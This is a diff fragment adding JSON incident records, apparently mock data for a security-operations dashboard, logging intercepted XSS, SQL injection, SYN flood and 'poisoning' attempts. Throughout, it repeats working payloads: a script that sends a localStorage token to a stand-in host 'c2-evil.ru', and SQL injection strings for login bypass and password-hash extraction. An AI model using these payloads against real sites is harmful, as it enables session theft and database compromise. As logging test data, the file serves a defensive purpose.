+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295450143",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:34:10",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295448142",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:34:08",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295446127",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:34:06",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295444122",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:34:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295438091",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:33:58",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295436078",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:33:56",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295432060",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:33:52",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295430057",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:33:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295426042",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:33:46",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295420034",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:33:40",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295418026",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:33:38",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295416025",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:33:36",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295414025",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:33:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295412023",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:33:32",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295405987",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:33:25",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295403977",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:33:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295401964",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:33:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295395957",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:33:15",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295393954",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:33:13",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295391939",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:33:11",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295389931",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:33:09",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295385924",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:33:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295383910",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:33:03",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295379899",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:32:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295375889",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:32:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295373876",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:32:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295371870",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:32:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295369862",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:32:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295367858",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:32:47",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295361844",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:32:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295359844",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:32:39",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295357838",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:32:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295355833",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:32:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295351817",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:32:31",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295349812",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:32:29",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295345792",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:32:25",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295343787",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:32:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295341782",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:32:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295335758",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:32:15",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295333748",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:32:13",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295331744",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:32:11",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295327726",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:32:07",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295325722",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:32:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295323717",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:32:03",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295319712",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:31:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295315694",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:31:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295313682",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:31:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295309663",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:31:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295307659",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:31:47",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295299630",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:31:39",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295297624",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:31:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295295616",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:31:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295291606",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:31:31",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295287588",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:31:27",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295283567",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:31:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295281567",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:31:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295279559",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:31:19",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295275549",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:31:15",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295273546",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:31:13",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295269526",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:31:09",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295267520",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:31:07",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295263512",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:31:03",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295259502",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:30:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295255482",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:30:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295253482",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:30:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295251459",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:30:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295249448",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:30:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295247436",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:30:47",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295243409",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:30:43",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295241401",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:30:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295239395",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:30:39",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295233386",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:30:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295229373",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:30:29",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295225360",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:30:25",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295223355",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:30:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295221349",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:30:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295217340",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:30:17",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295215327",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:30:15",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295211315",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:30:11",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295209310",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:30:09",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295207305",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:30:07",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295205290",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:30:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295199267",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:29:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295197261",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:29:57",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295195257",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:29:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
       "id": "inc-1790874759679",
       "ip": "103.145.13.2",
       "type": "DDOS",
